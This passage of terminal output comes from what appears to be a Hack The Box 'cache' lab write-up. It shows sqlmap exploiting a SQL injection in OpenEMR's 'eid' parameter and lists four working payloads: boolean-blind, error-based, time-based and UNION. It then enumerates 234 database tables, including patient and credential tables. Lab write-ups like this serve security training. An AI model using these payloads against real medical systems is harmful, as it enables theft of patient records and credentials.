class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr --tables --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [,]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:57:20 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:57:20] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:57:20] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[09:57:20] [INFO] testing connection to the target URL</span><br><span class="line">[09:57:21] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:57:21] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:57:21] [INFO] fetching tables for database: &#x27;openemr&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;addresses&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amc_misc_data&#x27;</span><br><span class="line">[09:57:22] [INFO] retrieved: &#x27;amendments&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;amendments_history&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_activity&#x27;</span><br><span class="line">[09:57:23] [INFO] retrieved: &#x27;ar_session&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;array&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_details&#x27;</span><br><span class="line">[09:57:24] [INFO] retrieved: &#x27;audit_master&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;automatic_notification&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;background_services&#x27;</span><br><span class="line">[09:57:25] [INFO] retrieved: &#x27;batchcom&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;billing&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;calendar_external&#x27;</span><br><span class="line">[09:57:26] [INFO] retrieved: &#x27;categories&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_seq&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;categories_to_documents&#x27;</span><br><span class="line">[09:57:27] [INFO] retrieved: &#x27;ccda&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_components&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_field_mapping&#x27;</span><br><span class="line">[09:57:28] [INFO] retrieved: &#x27;ccda_sections&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;ccda_table_mapping&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;chart_tracker&#x27;</span><br><span class="line">[09:57:29] [INFO] retrieved: &#x27;claims&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans&#x27;</span><br><span class="line">[09:57:30] [INFO] retrieved: &#x27;clinical_plans_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;clinical_rules_log&#x27;</span><br><span class="line">[09:57:31] [INFO] retrieved: &#x27;code_types&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes&#x27;</span><br><span class="line">[09:57:32] [INFO] retrieved: &#x27;codes_history&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;config_seq&#x27;</span><br><span class="line">[09:57:33] [INFO] retrieved: &#x27;customlists&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;dated_reminders_link&#x27;</span><br><span class="line">[09:57:34] [INFO] retrieved: &#x27;direct_message_log&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_categories&#x27;</span><br><span class="line">[09:57:35] [INFO] retrieved: &#x27;documents_legal_detail&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;documents_legal_master&#x27;</span><br><span class="line">[09:57:36] [INFO] retrieved: &#x27;drug_inventory&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_sales&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drug_templates&#x27;</span><br><span class="line">[09:57:37] [INFO] retrieved: &#x27;drugs&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_response&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;eligibility_verification&#x27;</span><br><span class="line">[09:57:38] [INFO] retrieved: &#x27;employer_data&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;enc_category_map&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_drug_paid&#x27;</span><br><span class="line">[09:57:39] [INFO] retrieved: &#x27;erx_narcotics&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_rx_log&#x27;</span><br><span class="line">[09:57:40] [INFO] retrieved: &#x27;erx_ttl_touch&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;esign_signatures&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;extended_log&#x27;</span><br><span class="line">[09:57:41] [INFO] retrieved: &#x27;external_encounters&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;external_procedures&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility&#x27;</span><br><span class="line">[09:57:42] [INFO] retrieved: &#x27;facility_user_ids&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;fee_sheet_options&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_care_plan&#x27;</span><br><span class="line">[09:57:43] [INFO] retrieved: &#x27;form_clinical_instructions&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_dictation&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_encounter&#x27;</span><br><span class="line">[09:57:44] [INFO] retrieved: &#x27;form_eye_mag&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_dispense&#x27;</span><br><span class="line">[09:57:45] [INFO] retrieved: &#x27;form_eye_mag_impplan&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_orders&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_prefs&#x27;</span><br><span class="line">[09:57:46] [INFO] retrieved: &#x27;form_eye_mag_wearing&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_functional_cognitive_status&#x27;</span><br><span class="line">[09:57:47] [INFO] retrieved: &#x27;form_group_attendance&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_groups_encounter&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_misc_billing_options&#x27;</span><br><span class="line">[09:57:48] [INFO] retrieved: &#x27;form_observation&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_reviewofs&#x27;</span><br><span class="line">[09:57:49] [INFO] retrieved: &#x27;form_ros&#x27;</span><br><span class="line">[09:57:50] [INFO] retrieved: &#x27;form_soap&#x27;</span><br><span class="line">[09:57:51] [INFO] retrieved: &#x27;form_taskman&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;form_vitals&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;forms&#x27;</span><br><span class="line">[09:57:52] [INFO] retrieved: &#x27;gacl_acl&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_sections&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_acl_seq&#x27;</span><br><span class="line">[09:57:53] [INFO] retrieved: &#x27;gacl_aco&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_map&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections&#x27;</span><br><span class="line">[09:57:54] [INFO] retrieved: &#x27;gacl_aco_sections_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aco_seq&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro&#x27;</span><br><span class="line">[09:57:55] [INFO] retrieved: &#x27;gacl_aro_groups&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_id_seq&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_groups_map&#x27;</span><br><span class="line">[09:57:56] [INFO] retrieved: &#x27;gacl_aro_map&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_sections_seq&#x27;</span><br><span class="line">[09:57:57] [INFO] retrieved: &#x27;gacl_aro_seq&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups&#x27;</span><br><span class="line">[09:57:58] [INFO] retrieved: &#x27;gacl_axo_groups_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_map&#x27;</span><br><span class="line">[09:57:59] [INFO] retrieved: &#x27;gacl_axo_sections&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_groups_aro_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_groups_axo_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_phpgacl&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_country_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_zone_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;globals&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;gprelations&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;groups&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;history_data&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_dx_order_code&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_10_9&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_10_9&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_pcs_order_code&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_dx_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_pcs_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd9_dx_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_dx_long_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_long_code&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunization_observation&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunizations&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_companies&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_data&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_numbers&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_encounter&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_types&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;lang_constants&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_custom&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_definitions&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_languages&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_group_properties&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_options&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;lbf_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lbt_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;list_options&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lists&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;lists_touch&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;log&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_comment_encrypt&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_validator&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;medex_icons&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_outgoing&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_prefs&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_recalls&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;misc_address_book&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_group_settings&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_sections&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_acl_user_settings&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_configuration&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;modules&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_hooks_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;multiple_db&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notes&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_log&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_settings&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onotes&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_documents&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_mail&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_messages&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_online&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_portal_activity&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_signatures&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;openemr_module_vars&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_modules&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_categories&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_events&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_limits&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_topics&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_session_info&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_offsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_onsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_birthday_alert&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_data&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_portal_menu&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_reminders&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker_element&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;payment_gateway_details&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;payments&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;pharmacies&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;phone_numbers&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_bookmark&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_column_info&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_history&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_pdf_pages&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_relation&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_coords&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_info&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pnotes&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prescriptions&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prices&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;procedure_answers&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order_code&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_providers&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_questions&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_report&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_result&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;procedure_type&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_registration&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_warehouse&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;registry&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_itemized&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_results&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action_item&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_filter&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_patient_data&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_reminder&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;rule_target&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;sequences&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;shared_attributes&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;standardized_tables_track&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;supported_external_dataloads&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;syndromic_surveillance&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;template_users&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups_counselors&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participant_attendance&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participants&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;transactions&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;user_settings&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users_facility&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;users_secure&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;valueset&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;version&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;voids&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;x12_partners&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">[234 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| array                                 |</span><br><span class="line">| groups                                |</span><br><span class="line">| log                                   |</span><br><span class="line">| version                               |</span><br><span class="line">| addresses                             |</span><br><span class="line">| amc_misc_data                         |</span><br><span class="line">| amendments                            |</span><br><span class="line">| amendments_history                    |</span><br><span class="line">| ar_activity                           |</span><br><span class="line">| ar_session                            |</span><br><span class="line">| audit_details                         |</span><br><span class="line">| audit_master                          |</span><br><span class="line">| automatic_notification                |</span><br><span class="line">| background_services                   |</span><br><span class="line">| batchcom                              |</span><br><span class="line">| billing                               |</span><br><span class="line">| calendar_external                     |</span><br><span class="line">| categories                            |</span><br><span class="line">| categories_seq                        |</span><br><span class="line">| categories_to_documents               |</span><br><span class="line">| ccda                                  |</span><br><span class="line">| ccda_components                       |</span><br><span class="line">| ccda_field_mapping                    |</span><br><span class="line">| ccda_sections                         |</span><br><span class="line">| ccda_table_mapping                    |</span><br><span class="line">| chart_tracker                         |</span><br><span class="line">| claims                                |</span><br><span class="line">| clinical_plans                        |</span><br><span class="line">| clinical_plans_rules                  |</span><br><span class="line">| clinical_rules                        |</span><br><span class="line">| clinical_rules_log                    |</span><br><span class="line">| code_types                            |</span><br><span class="line">| codes                                 |</span><br><span class="line">| codes_history                         |</span><br><span class="line">| config                                |</span><br><span class="line">| config_seq                            |</span><br><span class="line">| customlists                           |</span><br><span class="line">| dated_reminders                       |</span><br><span class="line">| dated_reminders_link                  |</span><br><span class="line">| direct_message_log                    |</span><br><span class="line">| documents                             |</span><br><span class="line">| documents_legal_categories            |</span><br><span class="line">| documents_legal_detail                |</span><br><span class="line">| documents_legal_master                |</span><br><span class="line">| drug_inventory                        |</span><br><span class="line">| drug_sales                            |</span><br><span class="line">| drug_templates                        |</span><br><span class="line">| drugs                                 |</span><br><span class="line">| eligibility_response                  |</span><br><span class="line">| eligibility_verification              |</span><br><span class="line">| employer_data                         |</span><br><span class="line">| enc_category_map                      |</span><br><span class="line">| erx_drug_paid                         |</span><br><span class="line">| erx_narcotics                         |</span><br><span class="line">| erx_rx_log                            |</span><br><span class="line">| erx_ttl_touch                         |</span><br><span class="line">| esign_signatures                      |</span><br><span class="line">| extended_log                          |</span><br><span class="line">| external_encounters                   |</span><br><span class="line">| external_procedures                   |</span><br><span class="line">| facility                              |</span><br><span class="line">| facility_user_ids                     |</span><br><span class="line">| fee_sheet_options                     |</span><br><span class="line">| form_care_plan                        |</span><br><span class="line">| form_clinical_instructions            |</span><br><span class="line">| form_dictation                        |</span><br><span class="line">| form_encounter                        |</span><br><span class="line">| form_eye_mag                          |</span><br><span class="line">| form_eye_mag_dispense                 |</span><br><span class="line">| form_eye_mag_impplan                  |</span><br><span class="line">| form_eye_mag_orders                   |</span><br><span class="line">| form_eye_mag_prefs                    |</span><br><span class="line">| form_eye_mag_wearing                  |</span><br><span class="line">| form_functional_cognitive_status      |</span><br><span class="line">| form_group_attendance                 |</span><br><span class="line">| form_groups_encounter                 |</span><br><span class="line">| form_misc_billing_options             |</span><br><span class="line">| form_observation                      |</span><br><span class="line">| form_reviewofs                        |</span><br><span class="line">| form_ros                              |</span><br><span class="line">| form_soap                             |</span><br><span class="line">| form_taskman                          |</span><br><span class="line">| form_vitals                           |</span><br><span class="line">| forms                                 |</span><br><span class="line">| gacl_acl                              |</span><br><span class="line">| gacl_acl_sections                     |</span><br><span class="line">| gacl_acl_seq                          |</span><br><span class="line">| gacl_aco                              |</span><br><span class="line">| gacl_aco_map                          |</span><br><span class="line">| gacl_aco_sections                     |</span><br><span class="line">| gacl_aco_sections_seq                 |</span><br><span class="line">| gacl_aco_seq                          |</span><br><span class="line">| gacl_aro                              |</span><br><span class="line">| gacl_aro_groups                       |</span><br><span class="line">| gacl_aro_groups_id_seq                |</span><br><span class="line">| gacl_aro_groups_map                   |</span><br><span class="line">| gacl_aro_map                          |</span><br><span class="line">| gacl_aro_sections                     |</span><br><span class="line">| gacl_aro_sections_seq                 |</span><br><span class="line">| gacl_aro_seq                          |</span><br><span class="line">| gacl_axo                              |</span><br><span class="line">| gacl_axo_groups                       |</span><br><span class="line">| gacl_axo_groups_map                   |</span><br><span class="line">| gacl_axo_map                          |</span><br><span class="line">| gacl_axo_sections                     |</span><br><span class="line">| gacl_groups_aro_map                   